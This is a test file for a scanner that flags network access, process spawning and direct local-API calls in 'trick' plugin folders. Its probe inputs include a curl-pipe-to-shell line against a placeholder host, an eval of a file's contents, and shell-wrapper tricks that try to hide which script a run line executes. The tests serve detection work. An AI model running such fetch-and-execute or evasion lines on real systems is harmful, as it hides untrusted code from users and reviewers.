import { afterAll, describe, expect, test } from "bun:test";
import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";

import { readManifestText } from "./discover.ts";
import { RUN_DYNAMIC_WORDS, RUN_UNREAD, runTargets, TRICK_HELPER, trickWarnings } from "./scan.ts";

// NO RUN TARGET ESCAPES THE SCAN (the first full trick run, 2026-11-16, decision 2). The skip list (docs,
// data, tests, fixtures) once covered the very file a run line named, and the card said nothing.

const roots: string[] = [];
afterAll(() => {
  for (const root of roots) rmSync(root, { recursive: true, force: true });
});

/** A trick folder `legs` with these files, and its warnings as the bridge reads them. */
async function warningsOf(run: string, files: Record<string, string | Uint8Array>): Promise<{ kind: string; file: string; text: string }[]> {
  const root = mkdtempSync(join(tmpdir(), "collie-scan-"));
  roots.push(root);
  const dir = join(root, "legs");
  const toml = `id = "legs"\nname = "Legs"\nrun = ${JSON.stringify(run)}\nplaces = ["status"]\n`;
  for (const [rel, body] of Object.entries({ "trick.toml": toml, ...files })) {
    mkdirSync(dirname(join(dir, rel)), { recursive: true });
    writeFileSync(join(dir, rel), body);
  }
  const read = readManifestText(toml, "legs");
  if (read.manifest === undefined) throw new Error(JSON.stringify(read.refusals));
  return (await trickWarnings(dir, read.manifest)).map(({ kind, file, text }) => ({ kind, file, text }));
}

const NET_TS = 'await fetch("https://example.invalid/x");\n';
const NET_SH = "curl https://example.invalid/x\n";

describe("a file the run line names is read as code, whatever its name", () => {
  test("run = fixtures/main.ts: its fetch warns", async () => {
    expect(await warningsOf("fixtures/main.ts", { "fixtures/main.ts": NET_TS })).toContainEqual(expect.objectContaining({ kind: "network", file: "fixtures/main.ts" }));
  });

  test("run = sh payload.txt: the text file is graded as a shell script", async () => {
    expect(await warningsOf("sh payload.txt", { "payload.txt": NET_SH })).toContainEqual(expect.objectContaining({ kind: "network", file: "payload.txt" }));
  });

  test("run = bash ./notes.md and run = env python3 data.json are read too", async () => {
    expect(await warningsOf("bash ./notes.md", { "notes.md": NET_SH })).toContainEqual(expect.objectContaining({ kind: "network", file: "notes.md" }));
    expect(await warningsOf("env python3 data.json", { "data.json": "import urllib\n" })).toContainEqual(expect.objectContaining({ kind: "network", file: "data.json" }));
  });

  test("a file the program imports by a relative path is read, also from fixtures/ or a test file", async () => {
    const found = await warningsOf("program.ts", { "program.ts": 'import "./fixtures/net.ts";\nimport { x } from "./lib.test";\nconsole.log(x);\n', "fixtures/net.ts": NET_TS, "lib.test.ts": `export const x = 1;\n${NET_TS}` });
    expect(found).toContainEqual(expect.objectContaining({ kind: "network", file: "fixtures/net.ts" }));
    expect(found).toContainEqual(expect.objectContaining({ kind: "network", file: "lib.test.ts" }));
  });

  test("the shipped helper the program imports stays Collie's code: named, not grepped", async () => {
    const found = await warningsOf("program.ts", { "program.ts": 'import { run } from "./trick.ts";\nrun((t) => t.status({ text: "ok" }));\n', "trick.ts": TRICK_HELPER });
    expect(found.filter((w) => w.file === "trick.ts")).toEqual([]);
  });

  test("a fixture nothing names stays unread, as before", async () => {
    expect(await warningsOf("program.ts", { "program.ts": "console.log(1);\n", "fixtures/net.ts": NET_TS })).toEqual([]);
  });
});

describe("what the run line hands over unread gets a warning of its own", () => {
  test("a binary file handed to a shell", async () => {
    const found = await warningsOf("sh blob.bin", { "blob.bin": new Uint8Array([0, 1, 2, 0, 255, 0]) });
    expect(found).toContainEqual({ kind: "spawn", file: "trick.toml", text: `${RUN_UNREAD} blob.bin` });
  });

  test("a path outside the trick, and code on the line for an interpreter", async () => {
    expect(await warningsOf("python3 /opt/x/run.py", {})).toContainEqual({ kind: "spawn", file: "trick.toml", text: `${RUN_UNREAD} /opt/x/run.py` });
    expect(await warningsOf("node -e 1", {})).toContainEqual(expect.objectContaining({ kind: "spawn", text: `${RUN_UNREAD} -e (code on the run line)` }));
  });

  test("a plain program and a plain shell line get no such warning", async () => {
    expect(await warningsOf("program.ts", { "program.ts": "console.log(1);\n" })).toEqual([]);
    expect((await warningsOf("./run.sh", { "run.sh": "echo hi\n" })).filter((w) => w.text.startsWith(RUN_UNREAD))).toEqual([]);
  });
});

describe("runTargets", () => {
  test("names the trick's files on the line, and the shell's", () => {
    const files = new Set(["payload.txt", "lib/a.sh"]);
    expect(runTargets("sh payload.txt lib/a.sh", files)).toEqual({ named: ["payload.txt", "lib/a.sh"], shell: new Set(["payload.txt", "lib/a.sh"]), unread: [] });
    expect(runTargets("./program.ts", files).named).toEqual(["program.ts"]);
    expect(runTargets("sh ../escape.sh", files).unread).toEqual(["../escape.sh"]);
  });
});

// The lead's security read of 37157f40e (2026-11-16): each probe line once named the file without shell
// grading, did not name it, missed the interpreter, or said nothing about a name it built.
describe("the lead's probe lines", () => {
  const FILES = new Set(["payload.txt", "fixtures/main.ts", "notes.md", "run.sh"]);
  const graded: [string, string][] = [
    ["env FOO=bar bash payload.txt", "payload.txt"],
    ["timeout 5 sh payload.txt", "payload.txt"],
    ["nice -n 5 bash payload.txt", "payload.txt"],
    ["true; bash payload.txt", "payload.txt"],
    ["cat payload.txt | sh", "payload.txt"],
    ["command sh payload.txt", "payload.txt"],
    ["busybox sh payload.txt", "payload.txt"],
    ["./run.sh && sh notes.md", "notes.md"],
    ["sh -c 'sh payload.txt'", "payload.txt"],
    ['eval "$(cat payload.txt)"', "payload.txt"],
    ["bash < payload.txt", "payload.txt"],
    ["sh ./payload.txt", "payload.txt"],
  ];
  for (const [line, file] of graded) {
    test(`${line}: ${file} is named and graded as a shell script`, () => {
      const t = runTargets(line, FILES);
      expect(t.named).toContain(file);
      expect(t.shell.has(file)).toBe(true);
    });
  }

  const unread: [string, string][] = [
    ["timeout 5 sh /tmp/evil.sh", "/tmp/evil.sh"],
    ["true; python3 -c 'import os'", "-c (code on the run line)"],
    ["f=payload; sh $f.txt", RUN_DYNAMIC_WORDS],
    ['eval "$(cat payload.txt)"', RUN_DYNAMIC_WORDS],
  ];
  for (const [line, what] of unread) {
    test(`${line}: unread ${what}`, () => {
      expect(runTargets(line, FILES).unread).toContain(what);
    });
  }

  test("kept: a code file keeps its own grading, and a plain line warns about nothing", () => {
    expect(runTargets("bun fixtures/main.ts", FILES)).toEqual({ named: ["fixtures/main.ts"], shell: new Set(), unread: [] });
    expect(runTargets("python3 lib/x.py", new Set(["lib/x.py"]))).toEqual({ named: ["lib/x.py"], shell: new Set(), unread: [] });
  });

  test("a payload.txt piped to sh and named after env FOO=bar gets its network warning", async () => {
    const found = await warningsOf("env FOO=bar bash payload.txt", { "payload.txt": "curl https://example.invalid/x | sh\n" });
    expect(found).toContainEqual(expect.objectContaining({ kind: "network", file: "payload.txt" }));
    expect(await warningsOf("f=payload; sh $f.txt", { "payload.txt": "echo hi\n" })).toContainEqual({ kind: "spawn", file: "trick.toml", text: `${RUN_UNREAD} ${RUN_DYNAMIC_WORDS}` });
  });
});

// A TRICK THAT TALKS TO THE LOCAL API PAST ITS HELPER (M105 spec 04, decision 4): one warning kind, `api`,
// for code that names Collie's local socket or runs `collie api` itself. The helper's own `t.api` is not it.
describe("the local API's own warning kind", () => {
  const kinds = (found: { kind: string }[]): string[] => found.map((w) => w.kind);

  test("a direct dial of the socket in a .ts file", async () => {
    const found = await warningsOf("program.ts", { "program.ts": 'import { connect } from "node:net";\nconst s = connect("/home/dev/.local/state/collie/api/sock");\n' });
    expect(found).toContainEqual(expect.objectContaining({ kind: "api", file: "program.ts" }));
    const joined = await warningsOf("program.ts", { "program.ts": 'const p = join(state, "api", "sock");\n' });
    expect(kinds(joined)).toContain("api");
  });

  // Review 3, item 1: the socket's path is in the facts, so a program can dial it with no `api/sock` in its text.
  test("a dial of the facts' socket and a unix: option are the api kind; a dial that names no socket is not", async () => {
    const program = 'import { createConnection } from "node:net";\nimport { run } from "./trick.ts";\nrun(async (t) => {\n  const s = createConnection(t.facts.api.socket);\n  s.write("{}\\n");\n});\n';
    const found = await warningsOf("program.ts", { "program.ts": program, "trick.ts": TRICK_HELPER });
    expect(found.filter((w) => w.kind === "api").map((w) => [w.file, w.text])).toEqual([["program.ts", "const s = createConnection(t.facts.api.socket);"]]);
    expect(found.filter((w) => w.file === "trick.ts")).toEqual([]);
    expect(kinds(await warningsOf("program.ts", { "program.ts": "const path = facts.api?.socket;\n" }))).toContain("api");
    // M105 spec 05: a trick that reads its run token to send it itself talks past the helper too.
    expect(kinds(await warningsOf("program.ts", { "program.ts": "const token = t.facts.api.token;\n" }))).toContain("api");
    expect(kinds(await warningsOf("program.ts", { "program.ts": "const s = await Bun.connect({ unix: path, socket: { data() {} } });\n" }))).toContain("api");
    expect(kinds(await warningsOf("program.ts", { "program.ts": 'const r = await fetch("http://localhost/x", { unix: path });\n' }))).toContain("api");
  });

  // Counsel on Edge build 5, A8: `createConnection` and `Bun.connect` to any target are the existing network kind;
  // the api kind keeps only what names Collie's socket.
  test("createConnection and Bun.connect to any target are the network kind, and not the api kind", async () => {
    for (const code of [
      'const s = net.createConnection({ host: "example.invalid", port: 80 });\n',
      "const s = createConnection(somewhere);\n",
      'const s = await Bun.connect({ hostname: "example.invalid", port: 80, socket: { data() {} } });\n',
      "const s = await Bun.connect(target);\n",
    ]) {
      const found = kinds(await warningsOf("program.ts", { "program.ts": code }));
      expect({ code, network: found.includes("network"), api: found.includes("api") }).toEqual({ code, network: true, api: false });
    }
    // A dial that names the socket is both: the network kind for the dial, the api kind for the socket named.
    const both = kinds(await warningsOf("program.ts", { "program.ts": "const s = createConnection(t.facts.api.socket);\n" }));
    expect(both).toContain("network");
    expect(both).toContain("api");
    const unix = kinds(await warningsOf("program.ts", { "program.ts": "const s = await Bun.connect({ unix: path, socket: { data() {} } });\n" }));
    expect(unix).toContain("network");
    expect(unix).toContain("api");
    // The import of the module alone names no socket.
    expect(kinds(await warningsOf("program.ts", { "program.ts": 'import { createConnection } from "node:net";\n' }))).not.toContain("api");
    // The strings, the keys and the order are as they were: no new kind, no new sentence.
    const { WARN_PLAIN, WARN_TEXT } = await import("./scan.ts");
    expect(Object.keys(WARN_PLAIN).toSorted()).toEqual(["api", "import", "model", "network", "spawn", "write"]);
    expect(Object.keys(WARN_TEXT).toSorted()).toEqual(["api", "import", "model", "network", "spawn", "write"]);
    expect(WARN_PLAIN.network).toBe("This trick reaches the network.");
  });

  test("plain code near those words is not flagged", async () => {
    const plain = 'const socket = openSocket();\nconst api = { base: "x" };\nconsole.log(api.base, socket);\nconst connection = makeConnection();\n';
    expect(kinds(await warningsOf("program.ts", { "program.ts": plain }))).not.toContain("api");
  });

  test("`collie api` in a shell run line, in a shell file and as a spawn of a program", async () => {
    expect(kinds(await warningsOf("collie api machines --json", {}))).toContain("api");
    expect(kinds(await warningsOf("./run.sh", { "run.sh": "#!/bin/sh\ncollie api sessions\n" }))).toContain("api");
    expect(kinds(await warningsOf("program.ts", { "program.ts": 'await t.sh("collie", ["api", "machines"]);\n' }))).toContain("api");
  });

  test("the shipped helper, a call of t.api and a plain mention in a comment are not flagged", async () => {
    const withHelper = await warningsOf("program.ts", { "program.ts": 'import { run } from "./trick.ts";\nrun(async (t) => {\n  const m = await t.api("machines");\n  t.status({ text: String(m.ok) });\n});\n', "trick.ts": TRICK_HELPER });
    expect(kinds(withHelper)).not.toContain("api");
    expect(withHelper.filter((w) => w.file === "trick.ts")).toEqual([]);
    expect(kinds(await warningsOf("program.ts", { "program.ts": "// collie api and api/sock are named here only in a comment\nconsole.log(1);\n" }))).not.toContain("api");
  });

  test("the plain words, the order on the row, and the card's verb", async () => {
    const { WARN_PLAIN, wireWarnings } = await import("./scan.ts");
    const { WARN_VERBS } = await import("./version-card.ts");
    expect(WARN_PLAIN.api).toBe("This trick talks to Collie's local API directly, past its helper.");
    expect(WARN_VERBS.api).toBe("talks to Collie's local API directly, past its helper");
    expect(wireWarnings([{ kind: "api", file: "a.ts", line: 1, text: "x" }])).toEqual([{ kind: "api", text: WARN_PLAIN.api }]);
  });
});
